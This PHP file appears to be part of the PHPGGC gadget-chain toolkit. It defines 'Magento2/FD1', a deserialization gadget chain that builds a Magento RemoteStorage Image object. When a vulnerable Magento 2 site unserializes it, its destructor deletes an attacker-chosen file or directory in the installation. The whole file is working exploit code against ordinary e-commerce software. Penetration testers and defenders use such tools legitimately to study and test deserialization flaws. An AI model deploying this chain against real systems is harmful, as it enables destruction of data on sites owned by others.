<?php

namespace GadgetChain\Magento2;

class FD1 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '*';
    public static $vector = '__destruct';
    public static $author = 'Arjun Shibu (twitter.com/0xsegf)';
    public static $information = 'Deletes a given file/directory in the installation dir';
    public static $parameters = ['file'];

    public function generate(array $parameters)
    {
        $file = $parameters['file'];

        return new \Magento\RemoteStorage\Plugin\Image($file);
    }
}
